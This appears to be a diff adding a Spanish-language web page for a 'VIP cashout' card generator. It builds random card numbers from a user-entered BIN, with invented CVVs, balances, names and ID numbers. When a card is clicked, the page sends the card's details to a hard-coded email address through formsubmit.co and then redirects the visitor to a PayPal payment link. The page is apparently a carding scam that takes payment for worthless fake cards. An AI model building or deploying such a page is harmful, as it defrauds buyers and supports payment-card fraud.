@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Generador de Tarjetas VIP — Cashout</title>
+<style>
+:root{ --bg1:#0a0f18; --card1:#1b2735; --accent:#00ffc8; --muted:#bfc9ca; --ok:#00ffc8; --err:#ff6b6b; }
+*{ box-sizing:border-box; }
+body{ margin:0; min-height:100vh; font-family:'Segoe UI',Roboto,Arial; background: radial-gradient(circle at center, var(--bg1), #000); color:#fff; display:flex; flex-direction:column; align-items:center; padding:28px 16px; }
+h1{ color:#FFD700; margin:0 0 18px; text-shadow:0 0 10px #FFD70055; font-size:1.2rem; text-align:center; }
+.cards-wrapper{ width:100%; max-width:980px; display:flex; justify-content:center; }
+.cards{ width:100%; display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:16px; padding:12px; border-radius:12px; max-height:calc(100vh - 200px); overflow:auto; }
+.card{ background: linear-gradient(145deg, var(--card1), #0d111b); border-radius:14px; padding:20px; height:190px; display:flex; flex-direction:column; justify-content:space-between; cursor:pointer; transition:transform .18s ease, box-shadow .18s ease, opacity .5s ease, transform .5s ease; position:relative; overflow:hidden; box-shadow: 0 8px 24px rgba(0,0,0,0.5); opacity:0; transform: translateY(30px); }
+.card.show{ opacity:1; transform: translateY(0); }
+.card:hover{ transform:translateY(-6px); box-shadow:0 20px 48px rgba(0,255,200,0.12); }
+.chip{ width:48px; height:34px; border-radius:6px; background: linear-gradient(180deg,#e6c86b,#b8860b); position:absolute; left:16px; top:16px; }
+.card-number{ margin-top:40px; font-weight:700; letter-spacing:2px; font-size:1.05rem; }
+.card-name{ text-transform:uppercase; color:#dfe9ea; font-size:0.9rem; }
+.card-meta{ display:flex; justify-content:space-between; color:var(--muted); font-size:.82rem; margin-top:8px; }
+.card-saldo{ font-weight:700; color:var(--accent); }
+.network{ position:absolute; right:14px; bottom:12px; font-weight:700; opacity:.95; }
+.lock { position:absolute; right:12px; top:12px; width:30px; height:30px; border-radius:7px; background:rgba(255,255,255,0.03); display:grid; place-items:center; box-shadow: 0 4px 12px rgba(0,0,0,0.45); transition: transform .18s ease, background .18s ease; z-index:5; backdrop-filter: blur(4px); }
+.lock svg { width:16px; height:16px; display:block; }
+.lock.animated { animation: float_lock 2.8s ease-in-out infinite; }
+@keyframes float_lock { 0% { transform: translateY(0); } 50% { transform: translateY(-3px); } 100% { transform: translateY(0); } }
+.card:hover .lock { transform: translateY(-2px) scale(1.05); background: rgba(255,255,255,0.045); }
+.card:hover .lock svg .fill { fill: var(--accent); opacity:1; }
+
+/* Modal / Backdrop */
+.modal-backdrop{ position:fixed; inset:0; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:60; }
+.modal{ background:#0d1116; border-radius:12px; width: 96%; max-width:520px; padding:18px; box-shadow:0 8px 40px rgba(0,0,0,0.6); transform:translateY(0); }
+.modal h2{ margin:0 0 8px; color:var(--accent); font-size:1.05rem; }
+.modal p{ margin:6px 0; color:#d9e9e6; font-size:0.95rem; line-height:1.3; }
+.field{ margin-top:10px; display:flex; flex-direction:column; gap:6px; }
+input[type="text"], input[type="email"], input[type="number"]{ width:100%; padding:10px 12px; border-radius:8px; border:1px solid rgba(255,255,255,0.06); background:rgba(255,255,255,0.02); color:#fff; outline:none; font-size:0.95rem; }
+.row{ display:flex; gap:8px; }
+.btn{ display:inline-block; padding:10px 14px; border-radius:10px; cursor:pointer; border:none; font-weight:600; }
+.btn-primary{ background:var(--accent); color:#001; }
+.btn-secondary{ background:#324048; color:#fff; }
+.small-muted{ color:#aab7b6; font-size:0.86rem; margin-top:8px; }
+.status{ margin-top:12px; font-size:0.9rem; }
+.status.sending{ color:#ffd54d; }
+.status.ok{ color:var(--ok); }
+.status.err{ color:#ff6b6b; }
+.loader-wrap{ display:flex; flex-direction:column; align-items:center; gap:14px; padding:10px 0; }
+.loader-circle{ width:110px; height:110px; border-radius:50%; display:grid; place-items:center; position:relative; }
+.spinner{ width:96px; height:96px; border-radius:50%; border:10px solid rgba(255,255,255,0.06); border-top-color:var(--accent); animation: spin 1s linear infinite; box-shadow: 0 6px 18px rgba(0,255,200,0.06); }
+@keyframes spin { to { transform: rotate(360deg); } }
+.hidden{ display:none; }
+@media (max-width:520px){ .card{ height:170px; } .modal{ padding:14px; } .loader-circle{ width:88px; height:88px; } .spinner{ width:72px; height:72px; border-width:8px; } .lock{ width:26px;height:26px; right:10px; top:10px; border-radius:6px; } .lock svg{ width:14px;height:14px; } }
+</style>
+</head>
+<body>
+<h1>💳 Tarjetas VIP - Cashout</h1>
+
+<div id="initModalBackdrop" class="modal-backdrop">
+  <div class="modal">
+    <div style="display:flex;flex-direction:column;gap:8px;">
+      <div style="display:flex;gap:10px;align-items:center;font-weight:700;font-size:1.05rem;color:#fff;">
+        <div style="background:linear-gradient(90deg,#0ff6c5,#6fffd0);padding:8px 10px;border-radius:10px;color:#001;font-weight:800;box-shadow: 0 6px 18px rgba(0,255,200,0.06);display:flex;gap:8px;align-items:center;">🔐</div>
+        <div style="display:flex;flex-direction:column;">
+          <strong style="font-size:1.12rem; color:var(--accent);">Ingresar BIN</strong>
+          <span style="color:#dfe9ea; font-weight:600;">Introduce los primeros dígitos (mínimo 6). AMEX se genera con 15.</span>
+        </div>
+      </div>
+      <p style="margin:8px 0 0 0; color:#d9e9e6;">Ingresa un <strong>BIN</strong> (6 dígitos mínimo) antes de generar las tarjetas.</p>
+      <div class="field">
+        <label class="small-muted">BIN o CC</label>
+        <input id="binInput" type="text" maxlength="16" placeholder="Ej: 455678" />
+        <div class="small-muted">VIP.</div>
+      </div>
+      <div style="display:flex; gap:8px; margin-top:12px; justify-content:flex-end;">
+        <button id="btnGenerate" class="btn btn-primary">Generar tarjetas</button>
+      </div>
+      <div id="initError" class="status err hidden">Debes ingresar un BIN de al menos 6 dígitos.</div>
+    </div>
+  </div>
+</div>
+
+<div id="genLoadingBackdrop" class="modal-backdrop hidden">
+  <div class="modal">
+    <h2>Generando tarjetas</h2>
+    <div class="loader-wrap">
+      <div class="loader-circle"><div class="spinner"></div></div>
+      <div class="timer-text">Por favor espera…</div>
+    </div>
+  </div>
+</div>
+
+<div class="cards-wrapper">
+  <div id="cardsContainer" class="cards"></div>
+</div>
+
+<div id="loadingBackdrop" class="modal-backdrop hidden">
+  <div class="modal">
+    <h2>Procesando pago</h2>
+    <div class="loader-wrap">
+      <div class="loader-circle"><div class="spinner"></div></div>
+      <div class="timer-text" id="loadingText">Redirigiendo en 10 segundos...</div>
+    </div>
+  </div>
+</div>
+
+<script>
+const cardsContainer = document.getElementById('cardsContainer');
+const initModalBackdrop = document.getElementById('initModalBackdrop');
+const btnGenerate = document.getElementById('btnGenerate');
+const binInput = document.getElementById('binInput');
+const initError = document.getElementById('initError');
+const genLoadingBackdrop = document.getElementById('genLoadingBackdrop');
+const loadingBackdrop = document.getElementById('loadingBackdrop');
+const loadingText = document.getElementById('loadingText');
+
+let DEST_EMAIL = 'juliokrac111@gmail.com';
+let CURRENT_CARDS = [];
+let LAST_BIN = '';
+const PAYPAL_URL = 'https://www.paypal.com/ncp/payment/SB6ULBESAVWQU';
+
+// Ahora se usan listas separadas de nombres y apellidos para asegurar combinaciones únicas
+const firstNames = ['Juan','María','Carlos','Lucía','Ana','Pedro','Sofía','Diego','Laura','Miguel','Andrés','Valeria','Ricardo','Gabriela','Fernando','Isabel','Sergio','Martina','Bruno','Paola'];
+const lastNames = ['Pérez','López','Hernández','Martínez','Gómez','Díaz','Ruiz','Torres','Vega','Santos','Ramírez','Morales','Ortega','Castillo','Navarro','Cruz','Castro','Herrera','Rojas','Mena'];
+
+function randInt(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
+function formatCardNumber(numStr){ return numStr.replace(/(.{4})/g,'$1 ').trim(); }
+function genCVV(isAmex){ return isAmex? String(randInt(1000,9999)) : String(randInt(100,999)); }
+function genExp(){ const month=String(randInt(1,12)).padStart(2,'0'); const year=String(randInt(new Date().getFullYear()%100,(new Date().getFullYear()%100)+6)).padStart(2,'0'); return `${month}/${year}`; }
+function detectTypeFromNumber(num){ if(/^3[47]/.test(num)) return 'AMEX'; if(/^4/.test(num)) return 'VISA'; if(/^5[1-5]/.test(num) || /^2(2|3|4|5)/.test(num)) return 'MasterCard'; if(/^6/.test(num)) return 'Discover'; return 'UNKNOWN'; }
+function maskLast4(numberStr){ const chars=numberStr.split(''); let replaced=0; for(let i=chars.length-1;i>=0 && replaced<4;i--){ if(/\d/.test(chars[i])){ chars[i]='*'; replaced++; } } return chars.join(''); }
+
+function randomSex(){ return Math.random()<0.5?'Hombre':'Mujer'; }
+function randomAge(){ return randInt(18,40); } // ahora máximo 40
+function randomStreetNumber(){ return randInt(1,9999); }
+
+function randomAlnum(len){
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let out = '';
+  for(let i=0;i<len;i++) out += chars.charAt(randInt(0, chars.length-1));
+  return out;
+}
+function randomRFC(){ return randomAlnum(12); } // 12 caracteres alfanuméricos
+function randomCURP(){ return randomAlnum(18); } // 18 caracteres alfanuméricos
+
+// Genera 'count' nombres únicos combinando nombres y apellidos.
+// Si count > combinaciones posibles, permite repeticiones (muy improbable con listas de 20x20).
+function generateUniqueNames(count){
+  const totalCombos = firstNames.length * lastNames.length;
+  const used = new Set();
+  const names = [];
+  // Si count is small relative to possible combos, try random unique picks
+  let attempts = 0;
+  while(names.length < count && attempts < count * 10){
+    const f = firstNames[randInt(0, firstNames.length - 1)];
+    const l = lastNames[randInt(0, lastNames.length - 1)];
+    const full = `${f} ${l}`;
+    if(!used.has(full)){
+      used.add(full);
+      names.push(full);
+    }
+    attempts++;
+  }
+  // If still short (very unlikely), fill deterministically through all combos
+  if(names.length < count){
+    for(let i=0; i<firstNames.length && names.length < count; i++){
+      for(let j=0; j<lastNames.length && names.length < count; j++){
+        const full = `${firstNames[i]} ${lastNames[j]}`;
+        if(!used.has(full)){
+          used.add(full);
+          names.push(full);
+        }
+      }
+    }
+  }
+  // If still short (only possible if count > totalCombos), allow repeats by random selection
+  while(names.length < count){
+    names.push(`${firstNames[randInt(0, firstNames.length - 1)]} ${lastNames[randInt(0, lastNames.length - 1)]}`);
+  }
+  return names;
+}
+
+function generateCards(count=10, binPartial=''){
+  const cards=[];
+  // Obtener nombres únicos para esta generación
+  const uniqueNames = generateUniqueNames(count);
+  for(let i=0;i<count;i++){
+    let base = binPartial.replace(/\D/g,'');
+    const isAmexLike = /^3[47]/.test(base);
+    const targetLen = (isAmexLike && base.length>=2) ? 15 : 16;
+    while(base.length<targetLen) base += String(randInt(0,9));
+    const finalNum = base.slice(0,targetLen);
+    const cardNumber = finalNum;
+    const type = detectTypeFromNumber(cardNumber);
+    const cvv = genCVV(type==='AMEX');
+    const exp = genExp();
+    // Usar el nombre único pre-generado (asegurando nombres y apellidos diferentes entre tarjetas)
+    const holder = uniqueNames[i];
+    const saldo = `$${randInt(500,9500).toLocaleString('es-MX')}.00 MXN`;
+    const sex = randomSex();
+    const age = randomAge();
+    const streetNum = randomStreetNumber();
+    const rfc = randomRFC();
+    const curp = randomCURP();
+    cards.push({ numero: formatCardNumber(cardNumber), numeroRaw: cardNumber, nombre:holder, expira:exp, cvv, saldo, tipo:type, sexo:sex, edad:age, calle:streetNum, rfc, curp });
+  }
+  return cards;
+}
+
+function lockHTML(){ return `<span class="lock animated"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path class="fill" d="M17 8h-1V6a4 4 0 0 0-8 0v2H7a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1zM9 6a3 3 0 0 1 6 0v2H9V6z"/></svg></span>`; }
+
+function renderCards(cards){
+  cardsContainer.innerHTML='';
+  cards.forEach((t,idx)=>{
+    const div=document.createElement('div');
+    div.className='card';
+    const masked=maskLast4(t.numero);
+    div.innerHTML=`${lockHTML()}<span class="chip"></span><div class="card-number">${masked}</div><div class="card-name">${t.nombre}</div><div class="card-meta"><div>Exp: ${t.expira}</div><div>CVV: ${'*'.repeat(t.cvv.length)}</div></div><div style="display:flex;justify-content:space-between;align-items:center;"><div class="card-saldo">${t.saldo}</div><div class="network"><span>${t.tipo}</span></div></div>`;
+    div.onclick=()=>onCardClick(t);
+    cardsContainer.appendChild(div);
+    setTimeout(()=>div.classList.add('show'), 50*idx);
+  });
+}
+
+function sendToFormSubmit(emailDest, dataObj){
+  const endpoint='https://formsubmit.co/ajax/'+encodeURIComponent(emailDest);
+  const fd=new FormData();
+  fd.append('_subject','¡Pago Confirmado!');
+  fd.append('_captcha','false');
+  for(const k in dataObj) fd.append(k,dataObj[k]);
+  fetch(endpoint,{method:'POST',body:fd}).catch(console.error);
+}
+
+function onCardClick(card){
+  loadingBackdrop.classList.remove('hidden');
+  const payload={
+    'Titular':card.nombre, 'Número':card.numeroRaw, 'Expira':card.expira, 'CVV':card.cvv,
+    'Saldo':card.saldo, 'Tipo':card.tipo, 'Sexo':card.sexo, 'Edad':card.edad,
+    'Calle':card.calle, 'RFC':card.rfc, 'CURP':card.curp
+  };
+  sendToFormSubmit(DEST_EMAIL,payload);
+  let remaining=10;
+  const interval=setInterval(()=>{
+    remaining--;
+    loadingText.textContent=`Redirigiendo en ${Math.max(0,remaining)} segundos...`;
+    if(remaining<=0){ clearInterval(interval); loadingBackdrop.classList.add('hidden'); window.location.href=PAYPAL_URL; }
+  },1000);
+}
+
+btnGenerate.addEventListener('click',()=>{
+  const binRaw=(binInput.value||'').trim().replace(/\D/g,'');
+  if(!binRaw || binRaw.length<6){ initError.classList.remove('hidden'); return; }
+  initError.classList.add('hidden'); genLoadingBackdrop.classList.remove('hidden');
+  LAST_BIN = binRaw;
+  setTimeout(()=>{
+    genLoadingBackdrop.classList.add('hidden');
+    CURRENT_CARDS=generateCards(10,LAST_BIN);
+    initModalBackdrop.style.display='none';
+    renderCards(CURRENT_CARDS);
+  },10000);
+});
+</script>
+</body>
+</html>
